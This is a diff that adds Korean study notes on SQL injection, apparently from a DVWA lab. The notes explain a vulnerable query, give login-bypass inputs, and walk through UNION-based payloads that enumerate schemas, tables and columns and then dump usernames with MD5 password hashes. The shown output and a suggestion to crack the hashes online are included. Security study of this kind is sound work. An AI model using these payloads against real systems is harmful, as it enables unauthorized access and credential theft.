@@ -333,3 +333,103 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 ?> 
 ```
+
+<br/>
+
+#### 5.4. SQL Injection
+>- SQL 쿼리를 통해 원하는 정보를 추출하는 취약점
+>- 백엔드에서 돌아가는 소스코드에 대해 알아야 한다.
+>- SQL DB를 통해 쉘(OS Shell) 실행도 가능
+>- 로그인 과정, 게시판 글 조회, 검색 등은 SQL 쿼리를 통해 이루어진다.
+
+쿼리문을 살펴보며 SQL Injection이 어떤 방식으로 발생하는지 알아보자. 
+```query
+ $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+```
+해당 쿼리는 사용자가 입력한 id와 일치하는 사용자 이름을 유저 테이블에서 가져오라는 의미이다. 위 구문에서 `$id` 부분이 사용자가 입력한 id가 들어오는 부분이다. 
+
+만약 악의적인 사용자가 `1' or '1'='1'#` 이라는 입력을 하게 되면 해당 query문은 다음과 같이 변할 것이다.  
+`$query  = "SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1'#;";` 
+WHERE절의 조건이 `user_id='1' or '1'='1'`이 되므로 해당 조건문은 참이 된다. 따라서 쿼리문은 무조건 데이터를 반환하게 된다. 
+
+SQL Injection에서는 Select 문의 조건절에 초점을 맞춘다. 조건절이 true가 되도록 쿼리를 완성하여 구조(문법) 오류를 제거하면 원하는 데이터를 받아올 수 있다. 
+
+`$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`  
+
+
+
+주로 로그인 칸에 'or 1=1 # , 'or 1=1 -- 를 입력하는 방식을 사용한다. 
++) #, -- : 주석 처리 구문. DBMS의 종류에 따라 달라진다.
+
+로그인 시 사용되는 쿼리는 다음과 같다. 
+`WHERE userid='1 AND pass='abcd''`
+쿼리 인젝션으로 ' 1=1 # 를 입력하면 쿼리는 아래와 같은 모습으로 변한다. 
+`WHERE userid=''or1=1 #AND pass='abcd'`
+즉, pass부분의 조건문은 주석처리 되므로 로그인 우회가 가능해진다. 
+
+where...
+'union select 1,2,3,...# 으로 컬럼개수를 파악한다. 구문오류 사용
+
+`1'union select 1,1# ` 입력 시 출력 확인
+
+select 1,@@version#
+
+1' union select 1,schema_name from information_schema.schemata#
+- schema_name : DB 이름
+- information_schema : table, DB 정보를 가지고 있는 테이블. DB 이름, Table 이름, 컬럼명을 저장. 
+다음과 같은 결과가 나온다.
+```
+ID: 1' union select 1,schema_name from information_schema.schemata#
+First name: admin
+Surname: admin
+
+ID: 1' union select 1,schema_name from information_schema.schemata#
+First name: 1
+Surname: information_schema
+
+ID: 1' union select 1,schema_name from information_schema.schemata#
+First name: 1
+Surname: dvwa
+```
+
+위에서 입력한 것에서 
+
+1'union select 1,table_name from information_schema.tables #
+모든 것이 출력된다. 
+
+1'union select 1,table_name from information_schema.tables  where table_schema='dvwa'# 
+를 입력하면 테이블을 지정할 수 있다. 
+여기서 users라는 테이블이 있다는 것을 확인할 수 있다. 
+
+여기서 컬럼명을 뽑아내 보자. 
+1'union select 1,column_name from information_schema.columns where table_name='users'# 
+우리는 여기서 user와 passwd를 알아보려고 한다. 
+1'union select user,password from users#
+```
+ID: 'union select user,password from users#
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+ID: 'union select user,password from users#
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+ID: 'union select user,password from users#
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+ID: 'union select user,password from users#
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+ID: 'union select user,password from users#
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+위에서 알아온 비밀번호 해시값을 cracksetation.net 에서 돌리면 로그인이 가능하다. 
+md5는 crack이 쉽다. 
+
+
+
+다만 SQL Injection을 실행하기 위해서는 탈취하고자 하는 서버의 쿼리 구조를 알아야 한다.
